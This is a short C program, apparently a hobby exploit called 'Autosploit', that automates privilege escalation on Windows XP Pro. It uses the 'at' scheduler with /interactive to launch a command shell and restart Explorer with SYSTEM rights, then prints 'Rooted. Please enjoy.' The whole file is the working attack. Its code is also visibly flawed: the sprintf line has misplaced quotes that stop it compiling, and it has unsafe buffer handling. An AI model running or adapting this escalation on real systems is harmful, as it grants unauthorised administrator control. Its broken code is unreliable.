/* PROJECT AUTOSPLOIT
 * File:   Main.c
 * Author: Original C version: Matthew Jack, with collaboration from Richard Childs
 * Updated to current version by Sean Edwards, April 13, 2014, 7:23 PM
 * 
 * Automated WinXPPro "at" privilege escalation exploit.
 * 
 * Created on October 8, 2012, 4:14 PM
 * Finished on October, 16, 2012, 7:56 PM
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

 time_t rawtime;
 struct tm *formtime;
    
int main(void) {

    time (&rawtime);
    rawtime += 60;
    formtime = localtime (&rawtime);
    int i;
    char time[10];
    char timeh[2];
    int timem1;
    char timem[1]; 
    char cmd[100];
    printf("Choose a mode: \n\t1. Automatic \n\t2. Manual\n       :");
    scanf("%d", &i);
   switch(i)
    {
  case 1:
    strftime(time, 10, "%H:%M", formtime);
    break;
  case 2:
    printf("Enter 24-hour time (format hh:mm): ");
    scanf("%s", &time);
    if (strlen(time)!=5)
    {
     fprintf(stderr,"Invalid time, enter as hh:mm (01:23). Exiting.");
        return 1;
    }
	
    break;
  default:
    printf("invalid choice. exiting.");
        return 1;
    }
	
	{
	sprintf(cmd, "at %s /interactive cmd /a /k \"taskkill /f /im explorer* && explorer.exe"\", time);
	system(cmd);
    }
   
    printf("Rooted. Please enjoy.\n");
    system("pause");

    
    return (0);
}
